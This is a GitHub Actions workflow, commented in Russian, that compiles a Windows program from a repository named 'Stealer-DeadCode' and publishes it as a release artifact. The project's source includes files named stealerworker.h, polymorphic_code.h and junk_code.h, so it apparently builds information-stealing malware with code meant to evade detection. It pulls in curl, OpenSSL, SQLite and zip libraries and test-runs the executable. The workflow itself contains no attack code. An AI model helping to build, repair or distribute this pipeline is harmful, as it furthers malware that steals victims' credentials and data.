name: Build DeadCode

on:
  push:
    branches:
      - main
  workflow_dispatch:
    inputs:
      cache-buster:
        description: 'Cache buster'
        default: '1'

jobs:
  build-windows:
    runs-on: windows-latest
    timeout-minutes: 120

    steps:
    # Шаг 1: Клонирование репозитория
    - name: Checkout repository
      uses: actions/checkout@v4
      with:
        path: Stealer-DeadCode
        fetch-depth: 0

    # Шаг 2: Установка Python
    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.11'

    # Шаг 3: Установка зависимостей Python для aqtinstall
    - name: Install Python dependencies for aqtinstall
      run: |
        Write-Host "Installing Python dependencies for aqtinstall..."
        python -m pip install --upgrade pip setuptools wheel
        python -m pip install py7zr aqtinstall requests beautifulsoup4
        python -m aqt version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Failed to install Python dependencies"
          exit 1
        }
      shell: powershell

    # Шаг 4: Кэширование Qt
    - name: Cache Qt
      uses: actions/cache@v4
      with:
        path: C:/Qt
        key: qt-5.15.2-${{ runner.os }}-mingw81_64-${{ github.event.inputs.cache-buster || '1' }}
        restore-keys: |
          qt-5.15.2-${{ runner.os }}-mingw81_64-

    # Шаг 5: Установка Qt 5.15.2 через aqtinstall
    - name: Install Qt 5.15.2 via aqtinstall
      run: |
        Write-Host "Installing Qt 5.15.2 with MinGW 8.1..."
        python -m aqt install-qt windows desktop 5.15.2 win64_mingw81 -O C:/Qt --archives qtbase qttools qtsvg qtdeclarative qtquickcontrols qtquickcontrols2 qtgraphicaleffects qtimageformats qtsql qtquick qtquicktimeline qtquick3d qtwinextras
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Failed to install Qt 5.15.2 via aqtinstall"
          exit 1
        }
        # Проверка наличия ключевых файлов Qt
        $qtFiles = @("C:/Qt/5.15.2/mingw81_64/bin/qmake.exe", "C:/Qt/5.15.2/mingw81_64/bin/Qt5Core.dll")
        foreach ($file in $qtFiles) {
          if (-not (Test-Path $file)) {
            Write-Host "Error: Qt installation incomplete, $file not found"
            dir C:/Qt -Recurse
            exit 1
          }
        }
        Write-Host "Qt installation completed."
      shell: powershell

    # Шаг 6: Установка MinGW 8.1 через aqtinstall
    - name: Install MinGW 8.1 via aqtinstall
      run: |
        Write-Host "Installing MinGW 8.1..."
        python -m aqt install-tool windows desktop tools_mingw qt.tools.win64_mingw810 -O C:/Qt
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Failed to install MinGW 8.1 via aqtinstall"
          exit 1
        }
        # Проверка наличия g++.exe
        if (-not (Test-Path "C:/Qt/Tools/mingw810_64/bin/g++.exe")) {
          Write-Host "Error: MinGW installation incomplete, g++.exe not found"
          dir C:/Qt/Tools -Recurse
          exit 1
        }
        Write-Host "MinGW 8.1 installation completed."
      shell: powershell

    # Шаг 7: Проверка установки Qt и MinGW
    - name: Verify Qt and MinGW installation
      run: |
        Write-Host "Verifying Qt and MinGW installation..."
        $qmakePath = "C:/Qt/5.15.2/mingw81_64/bin/qmake.exe"
        $uicPath = "C:/Qt/5.15.2/mingw81_64/bin/uic.exe"
        $mingwBinPath = "C:/Qt/Tools/mingw810_64/bin"
        $gppPath = "$mingwBinPath/g++.exe"
        $makePath = "$mingwBinPath/mingw32-make.exe"
        $qtCoreDll = "C:/Qt/5.15.2/mingw81_64/bin/Qt5Core.dll"

        # Проверка наличия файлов
        foreach ($path in @($qmakePath, $uicPath, $gppPath, $makePath, $qtCoreDll)) {
          if (-not (Test-Path $path)) {
            Write-Host "Error: $path not found"
            dir C:/Qt -Recurse
            exit 1
          }
        }

        # Настройка PATH
        $env:Path = "C:/Qt/5.15.2/mingw81_64/bin;$mingwBinPath;" + $env:Path
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)

        # Проверка версий
        Write-Host "Qt version:"
        & $qmakePath --version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: qmake --version failed"
          exit 1
        }
        Write-Host "g++ version:"
        & $gppPath --version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: g++ --version failed"
          exit 1
        }
        Write-Host "mingw32-make version:"
        & $makePath --version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: mingw32-make --version failed"
          exit 1
        }
        Write-Host "Qt and MinGW setup verified successfully"
      shell: powershell

    # Шаг 8: Установка Perl (требуется для Qt)
    - name: Install Perl (required for Qt)
      run: |
        Write-Host "Installing Perl via Chocolatey..."
        choco install strawberryperl -y --force --execution-timeout 600
        if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne 3010) {
          Write-Host "Error: Failed to install Perl via Chocolatey (exit code: $LASTEXITCODE)"
          exit 1
        }
        Write-Host "Refreshing environment variables..."
        Import-Module "$env:ChocolateyInstall/helpers/chocolateyProfile.psm1" -ErrorAction SilentlyContinue
        refreshenv
        Write-Host "Perl installation completed"
      shell: powershell

    # Шаг 9: Кэширование vcpkg
    - name: Cache vcpkg
      uses: actions/cache@v4
      with:
        path: C:/vcpkg
        key: vcpkg-${{ hashFiles('Stealer-DeadCode/vcpkg.json') }}-${{ github.event.inputs.cache-buster || '1' }}
        restore-keys: |
          vcpkg-

    # Шаг 10: Проверка и обновление vcpkg.json
    - name: Check and update vcpkg.json
      run: |
        Set-Location -Path $env:GITHUB_WORKSPACE/Stealer-DeadCode
        Write-Host "Checking vcpkg.json..."
        if (-not (Test-Path vcpkg.json)) {
          Write-Host "Error: vcpkg.json not found in Stealer-DeadCode directory"
          dir .
          exit 1
        }

        Write-Host "Current vcpkg.json content:"
        Get-Content vcpkg.json

        Write-Host "Updating builtin-baseline in vcpkg.json..."
        $vcpkgJson = Get-Content -Path vcpkg.json -Raw | ConvertFrom-Json

        # Проверяем наличие builtin-baseline
        if (-not $vcpkgJson.PSObject.Properties.Match('builtin-baseline')) {
          Write-Host "Error: builtin-baseline not found in vcpkg.json. Please add it manually."
          exit 1
        }

        # Обновляем builtin-baseline на новый коммит
        $vcpkgJson.'builtin-baseline' = "0c72420dd3ccbaddf6bb4c35bf6079698ddae3f6"
        Write-Host "Updated builtin-baseline to 0c72420dd3ccbaddf6bb4c35bf6079698ddae3f6"

        # Сохраняем обновлённый vcpkg.json
        $vcpkgJson | ConvertTo-Json -Depth 10 | Set-Content -Path vcpkg.json -Encoding UTF8
        Write-Host "Updated vcpkg.json content:"
        Get-Content vcpkg.json
      shell: powershell

    # Шаг 11: Очистка и обновление vcpkg
    - name: Clean and update vcpkg
      run: |
        if (Test-Path C:/vcpkg) {
          Write-Host "Cleaning existing vcpkg directory..."
          Remove-Item -Path C:/vcpkg -Recurse -Force
        }
        Write-Host "Cloning vcpkg repository..."
        & git clone https://github.com/microsoft/vcpkg.git C:/vcpkg
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Failed to clone vcpkg repository"
          exit 1
        }
        Set-Location -Path C:/vcpkg
        Write-Host "Fetching all commits..."
        & git fetch --unshallow
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Failed to fetch vcpkg commits"
          exit 1
        }
        Write-Host "Checking out commit 0c72420dd3ccbaddf6bb4c35bf6079698ddae3f6..."
        & git checkout 0c72420dd3ccbaddf6bb4c35bf6079698ddae3f6
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Failed to checkout commit 0c72420dd3ccbaddf6bb4c35bf6079698ddae3f6"
          exit 1
        }
        Write-Host "Running bootstrap-vcpkg..."
        & ./bootstrap-vcpkg.bat -disableMetrics
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Bootstrap failed. Check the logs."
          exit 1
        }
        Write-Host "vcpkg version:"
        & ./vcpkg.exe --version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Failed to get vcpkg version"
          exit 1
        }
      shell: powershell

    # Шаг 12: Проверка доступных версий библиотек
    - name: Check available library versions
      run: |
        Set-Location -Path C:/vcpkg
        Write-Host "Checking available versions of required libraries..."
        $libraries = @("libzip", "sqlite3", "zlib", "bzip2", "curl", "openssl")
        foreach ($lib in $libraries) {
          Write-Host "Searching for $lib..."
          & ./vcpkg.exe search $lib
          if ($LASTEXITCODE -ne 0) {
            Write-Host "Error: Failed to search for $lib"
            exit 1
          }
        }
      shell: powershell

    # Шаг 13: Установка vcpkg и зависимостей
    - name: Install vcpkg and dependencies
      run: |
        Set-Location -Path C:/vcpkg
        Write-Host "Integrating vcpkg..."
        $vcpkgExe = "C:/vcpkg/vcpkg.exe"
        & $vcpkgExe integrate install
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: vcpkg integrate install failed"
          exit 1
        }

        $env:Path = "C:/vcpkg;" + $env:Path
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)

        # Возвращаемся в корень проекта
        Set-Location -Path $env:GITHUB_WORKSPACE/Stealer-DeadCode
        Write-Host "Current directory: $(Get-Location)"

        Write-Host "Installing vcpkg dependencies with triplet x64-mingw-dynamic..."
        & $vcpkgExe install --triplet x64-mingw-dynamic --clean-after-build 2>&1 | Tee-Object -FilePath "vcpkg_install.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: vcpkg install failed. Check vcpkg_install.log for details."
          Get-Content vcpkg_install.log
          exit 1
        }

        Write-Host "vcpkg installation completed successfully"
      shell: powershell

    # Шаг 14: Загрузка логов vcpkg в случае ошибки
    - name: Upload vcpkg logs
      if: failure()
      uses: actions/upload-artifact@v4
      with:
        name: vcpkg-logs
        path: Stealer-DeadCode/vcpkg_install.log
        if-no-files-found: warn

    # Шаг 15: Проверка установки vcpkg
    - name: Verify vcpkg installation
      run: |
        $libDir = "C:/vcpkg/installed/x64-mingw-dynamic/lib"
        $binDir = "C:/vcpkg/installed/x64-mingw-dynamic/bin"
        $includeDir = "C:/vcpkg/installed/x64-mingw-dynamic/include"
        $libs = @("libsqlite3.lib", "libzip.lib", "zlib.lib", "bz2.lib", "libcurl.lib", "libssl.lib", "libcrypto.lib")
        $dlls = @("sqlite3.dll", "libzip.dll", "zlib1.dll", "bz2.dll", "libcurl.dll", "libssl-1_1-x64.dll", "libcrypto-1_1-x64.dll")
        $headers = @("sqlite3.h", "zip.h", "zlib.h", "bzlib.h", "curl/curl.h", "openssl/ssl.h", "openssl/crypto.h")
        $missing = @()

        Write-Host "Checking libraries in $libDir..."
        foreach ($lib in $libs) {
          if (-not (Test-Path "$libDir/$lib")) {
            $missing += "$lib"
          }
        }

        Write-Host "Checking DLLs in $binDir..."
        foreach ($dll in $dlls) {
          if (-not (Test-Path "$binDir/$dll")) {
            $missing += "$dll"
          }
        }

        Write-Host "Checking headers in $includeDir..."
        foreach ($header in $headers) {
          if (-not (Test-Path "$includeDir/$header")) {
            $missing += $header
          }
        }

        if ($missing) {
          Write-Host "Error: Missing libraries, DLLs, or header files: $missing"
          Write-Host "Listing contents of $libDir:"
          dir $libDir -ErrorAction SilentlyContinue
          Write-Host "Listing contents of $binDir:"
          dir $binDir -ErrorAction SilentlyContinue
          Write-Host "Listing contents of $includeDir:"
          dir $includeDir -Recurse -ErrorAction SilentlyContinue
          exit 1
        }
        Write-Host "All vcpkg dependencies verified as dynamic"
      shell: powershell

    # Шаг 16: Проверка структуры проекта
    - name: Verify project structure
      run: |
        Set-Location -Path $env:GITHUB_WORKSPACE/Stealer-DeadCode
        Write-Host "Current directory: $(Get-Location)"
        $requiredFiles = @(
          "ui/DeadCode.pro",
          "src/main.cpp",
          "ui/mainwindow.ui",
          "ui/mainwindow.cpp",
          "ui/mainwindow.h",
          "src/build_key.h",
          "src/polymorphic_code.h",
          "src/junk_code.h",
          "src/stealerworker.h",
          "src/compat.h",
          "icon.rc",
          "icon.ico"
        )
        $missingFiles = @()
        foreach ($file in $requiredFiles) {
          if (-not (Test-Path $file)) {
            $missingFiles += $file
          }
        }
        if ($missingFiles) {
          Write-Host "Error: Missing required files: $missingFiles"
          dir ui -ErrorAction SilentlyContinue
          dir src -ErrorAction SilentlyContinue
          dir . -ErrorAction SilentlyContinue
          exit 1
        }
        Write-Host "Creating build directory if it doesn't exist..."
        New-Item -Path build -ItemType Directory -Force
        Write-Host "Creating build/release directory if it doesn't exist..."
        New-Item -Path build/release -ItemType Directory -Force
        Write-Host "Project structure verified"
      shell: powershell

    # Шаг 17: Исправление кодировки icon.rc
    - name: Fix icon.rc encoding
      run: |
        Set-Location -Path $env:GITHUB_WORKSPACE/Stealer-DeadCode
        Write-Host "Fixing encoding of icon.rc..."
        $content = Get-Content -Path icon.rc -Raw -Encoding UTF8
        Set-Content -Path icon.rc -Value $content -NoNewline -Encoding ASCII
        Write-Host "icon.rc encoding fixed to ASCII"
      shell: powershell

    # Шаг 18: Генерация UI-файлов
    - name: Generate UI files
      run: |
        Set-Location -Path $env:GITHUB_WORKSPACE/Stealer-DeadCode
        Write-Host "Generating ui_mainwindow.h from ui/mainwindow.ui..."
        $uicPath = "C:/Qt/5.15.2/mingw81_64/bin/uic.exe"
        $outputPath = "build/release/ui_mainwindow.h"
        if (-not (Test-Path $uicPath)) {
          Write-Host "Error: uic.exe not found at $uicPath"
          exit 1
        }
        & $uicPath ui/mainwindow.ui -o $outputPath 2>&1 | Tee-Object -FilePath "uic_output.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: uic.exe failed. Check uic_output.log for details."
          Get-Content uic_output.log
          exit 1
        }
        if (-not (Test-Path $outputPath)) {
          Write-Host "Error: $outputPath was not generated"
          exit 1
        }
        Write-Host "ui_mainwindow.h generated successfully at $outputPath"
      shell: powershell

    # Шаг 19: Конфигурация и сборка проекта
    - name: Configure and build
      run: |
        Set-Location -Path $env:GITHUB_WORKSPACE/Stealer-DeadCode
        Write-Host "Setting up temporary directory..."
        $tempDir = "C:/Temp"
        if (-not (Test-Path $tempDir)) {
          New-Item -Path $tempDir -ItemType Directory -Force
        }
        $env:TEMP = $tempDir
        $env:TMP = $tempDir
        Write-Host "TEMP set to: $env:TEMP"
        Write-Host "TMP set to: $env:TMP"

        $env:Path = "C:/Qt/5.15.2/mingw81_64/bin;C:/Qt/Tools/mingw810_64/bin;C:/vcpkg;" + $env:Path
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
        Write-Host "Updated PATH: $env:Path"

        # Устанавливаем QML2_IMPORT_PATH
        $env:QML2_IMPORT_PATH = "C:/Qt/5.15.2/mingw81_64/qml"
        [System.Environment]::SetEnvironmentVariable("QML2_IMPORT_PATH", $env:QML2_IMPORT_PATH, [System.EnvironmentVariableTarget]::Process)
        Write-Host "QML2_IMPORT_PATH set to: $env:QML2_IMPORT_PATH"

        # Устанавливаем BUILD_DATE и BUILD_VERSION
        $buildDate = Get-Date -Format "yyyy-MM-dd"
        $buildVersion = git rev-parse --short HEAD
        if (-not $buildVersion) {
          $buildVersion = "unknown"
        }
        Write-Host "Build Date: $buildDate"
        Write-Host "Build Version: $buildVersion"

        Set-Location -Path build
        Write-Host "Running qmake..."
        $qmakePath = "C:/Qt/5.15.2/mingw81_64/bin/qmake.exe"
        $qmakeArgs = @(
          "../ui/DeadCode.pro",
          "CONFIG+=release",
          "QMAKE_CXXFLAGS+=-Wno-attributes",
          "DEFINES+=BUILD_DATE=`"$buildDate`"",
          "DEFINES+=BUILD_VERSION=`"$buildVersion`""
        )
        & $qmakePath $qmakeArgs 2>&1 | Tee-Object -FilePath "../qmake_output.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: qmake failed. Check qmake_output.log for details."
          Get-Content ../qmake_output.log
          exit 1
        }

        Write-Host "Running mingw32-make..."
        $makePath = "C:/Qt/Tools/mingw810_64/bin/mingw32-make.exe"
        & $makePath -f Makefile.Release -j1 2>&1 | Tee-Object -FilePath "../make_output.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: mingw32-make failed. Check make_output.log for details."
          Get-Content ../make_output.log
          exit 1
        }

        if (-not (Test-Path release/DeadCode.exe)) {
          Write-Host "Error: DeadCode.exe was not generated in build/release/"
          dir .
          dir release
          exit 1
        }
        Write-Host "Build completed successfully"
      shell: powershell

    # Шаг 20: Тестирование запуска DeadCode.exe
    - name: Test run DeadCode.exe
      run: |
        Set-Location -Path $env:GITHUB_WORKSPACE/Stealer-DeadCode/build
        $env:Path = "C:/Qt/5.15.2/mingw81_64/bin;C:/Qt/Tools/mingw810_64/bin;C:/vcpkg/installed/x64-mingw-dynamic/bin;" + $env:Path
        Write-Host "Running DeadCode.exe..."
        try {
          Start-Process -FilePath "release/DeadCode.exe" -NoNewWindow -Wait -RedirectStandardOutput "deadcode_output.log" -RedirectStandardError "deadcode_error.log"
          Write-Host "DeadCode.exe executed successfully."
          Write-Host "Standard Output:"
          Get-Content "deadcode_output.log" -ErrorAction SilentlyContinue
          Write-Host "Standard Error:"
          Get-Content "deadcode_error.log" -ErrorAction SilentlyContinue
        } catch {
          Write-Host "Error: Failed to run DeadCode.exe"
          Write-Host "Standard Output:"
          Get-Content "deadcode_output.log" -ErrorAction SilentlyContinue
          Write-Host "Standard Error:"
          Get-Content "deadcode_error.log" -ErrorAction SilentlyContinue
          exit 1
        }
      shell: powershell

    # Шаг 21: Копирование необходимых DLL и плагинов Qt
    - name: Copy Qt DLLs and dependencies
      run: |
        Set-Location -Path $env:GITHUB_WORKSPACE/Stealer-DeadCode/build
        Write-Host "Copying Qt DLLs and dependencies to release directory..."
        $qtBinDir = "C:/Qt/5.15.2/mingw81_64/bin"
        $mingwBinDir = "C:/Qt/Tools/mingw810_64/bin"
        $qtPluginsDir = "C:/Qt/5.15.2/mingw81_64/plugins"
        $qtQmlDir = "C:/Qt/5.15.2/mingw81_64/qml"
        $vcpkgBinDir = "C:/vcpkg/installed/x64-mingw-dynamic/bin"

        # Основные Qt DLL
        $requiredQtDlls = @(
          "Qt5Core.dll",
          "Qt5Gui.dll",
          "Qt5Network.dll",
          "Qt5Widgets.dll",
          "Qt5Svg.dll",
          "Qt5Declarative.dll",
          "Qt5Quick.dll",
          "Qt5QuickControls2.dll",
          "Qt5QuickWidgets.dll",
          "Qt5Sql.dll",
          "Qt5Qml.dll",
          "Qt5QmlModels.dll",
          "Qt5QmlWorkerScript.dll"
        )

        # MinGW DLL
        $requiredMingwDlls = @(
          "libwinpthread-1.dll",
          "libgcc_s_seh-1.dll",
          "libstdc++-6.dll"
        )

        # VCPKG DLL
        $requiredVcpkgDlls = @(
          "sqlite3.dll",
          "libzip.dll",
          "zlib1.dll",
          "bz2.dll",
          "libcurl.dll",
          "libssl-1_1-x64.dll",
          "libcrypto-1_1-x64.dll"
        )

        # Копируем Qt DLL
        foreach ($dll in $requiredQtDlls) {
          if (Test-Path "$qtBinDir/$dll") {
            Copy-Item -Path "$qtBinDir/$dll" -Destination release/ -Force
            Write-Host "Copied $dll to release directory"
          } else {
            Write-Host "Error: $dll not found in $qtBinDir"
            exit 1
          }
        }

        # Копируем MinGW DLL
        foreach ($dll in $requiredMingwDlls) {
          if (Test-Path "$mingwBinDir/$dll") {
            Copy-Item -Path "$mingwBinDir/$dll" -Destination release/ -Force
            Write-Host "Copied $dll to release directory"
          } else {
            Write-Host "Error: $dll not found in $mingwBinDir"
            exit 1
          }
        }

        # Копируем VCPKG DLL
        foreach ($dll in $requiredVcpkgDlls) {
          if (Test-Path "$vcpkgBinDir/$dll") {
            Copy-Item -Path "$vcpkgBinDir/$dll" -Destination release/ -Force
            Write-Host "Copied $dll to release directory"
          } else {
            Write-Host "Error: $dll not found in $vcpkgBinDir"
            exit 1
          }
        }

        # Копируем Qt плагины
        if (Test-Path "$qtPluginsDir") {
          $pluginDirs = @(
            @{ Source = "platforms/qwindows.dll"; Dest = "platforms" },
            @{ Source = "styles/qwindowsvistastyle.dll"; Dest = "styles" },
            @{ Source = "imageformats/*.dll"; Dest = "imageformats" },
            @{ Source = "quick/*.dll"; Dest = "quick" },
            @{ Source = "qmltooling/*.dll"; Dest = "qmltooling" },
            @{ Source = "sqldrivers/*.dll"; Dest = "sqldrivers" }
          )
          foreach ($plugin in $pluginDirs) {
            if (Test-Path "$qtPluginsDir/$($plugin.Source)") {
              New-Item -Path "release/$($plugin.Dest)" -ItemType Directory -Force
              Copy-Item -Path "$qtPluginsDir/$($plugin.Source)" -Destination "release/$($plugin.Dest)/" -Force -ErrorAction SilentlyContinue
              Write-Host "Copied Qt plugin $($plugin.Source)"
            } else {
              Write-Host "Warning: Qt plugin $($plugin.Source) not found in $qtPluginsDir"
            }
          }
        } else {
          Write-Host "Error: Qt plugins directory not found at $qtPluginsDir"
          exit 1
        }

        # Копируем QML-модули
        if (Test-Path "$qtQmlDir") {
          $qmlModules = @(
            "QtQml",
            "QtQuick",
            "QtQuick.2",
            "QtQuick.Controls",
            "QtQuick.Controls.2",
            "QtQuick.Layouts",
            "QtQuick.Templates.2",
            "QtQuick.Window.2",
            "QtGraphicalEffects",
            "Qt"
          )
          foreach ($module in $qmlModules) {
            if (Test-Path "$qtQmlDir/$module") {
              New-Item -Path "release/$module" -ItemType Directory -Force
              Copy-Item -Path "$qtQmlDir/$module/*" -Destination "release/$module/" -Recurse -Force -ErrorAction SilentlyContinue
              Write-Host "Copied QML module $module"
            } else {
              Write-Host "Warning: QML module $module not found in $qtQmlDir"
            }
          }
        } else {
          Write-Host "Error: QML directory not found at $qtQmlDir"
          exit 1
        }

        Write-Host "Listing contents of release directory:"
        dir release -Recurse
      shell: powershell

    # Шаг 22: Загрузка логов сборки в случае ошибки
    - name: Upload build logs
      if: failure()
      uses: actions/upload-artifact@v4
      with:
        name: build-logs
        path: |
          Stealer-DeadCode/qmake_output.log
          Stealer-DeadCode/make_output.log
          Stealer-DeadCode/uic_output.log
          Stealer-DeadCode/vcpkg_install.log
          Stealer-DeadCode/build/deadcode_output.log
          Stealer-DeadCode/build/deadcode_error.log
        if-no-files-found: warn

    # Шаг 23: Загрузка артефакта
    - name: Upload artifact
      uses: actions/upload-artifact@v4
      with:
        name: DeadCode-Build
        path: |
          Stealer-DeadCode/build/release/DeadCode.exe
          Stealer-DeadCode/build/release/*.dll
          Stealer-DeadCode/build/release/platforms/qwindows.dll
          Stealer-DeadCode/build/release/styles/qwindowsvistastyle.dll
          Stealer-DeadCode/build/release/imageformats/*.dll
          Stealer-DeadCode/build/release/quick/*.dll
          Stealer-DeadCode/build/release/qmltooling/*.dll
          Stealer-DeadCode/build/release/sqldrivers/*.dll
          Stealer-DeadCode/build/release/QtQml/**/*
          Stealer-DeadCode/build/release/QtQuick/**/*
          Stealer-DeadCode/build/release/QtQuick.2/**/*
          Stealer-DeadCode/build/release/QtQuick.Controls/**/*
          Stealer-DeadCode/build/release/QtQuick.Controls.2/**/*
          Stealer-DeadCode/build/release/QtQuick.Layouts/**/*
          Stealer-DeadCode/build/release/QtQuick.Templates.2/**/*
          Stealer-DeadCode/build/release/QtQuick.Window.2/**/*
          Stealer-DeadCode/build/release/QtGraphicalEffects/**/*
          Stealer-DeadCode/build/release/Qt/**/*
        if-no-files-found: error

    # Шаг 24: Очистка
    - name: Cleanup
      if: always()
      run: |
        Remove-Item -Path "Stealer-DeadCode/build" -Recurse -Force -ErrorAction SilentlyContinue
      shell: powershell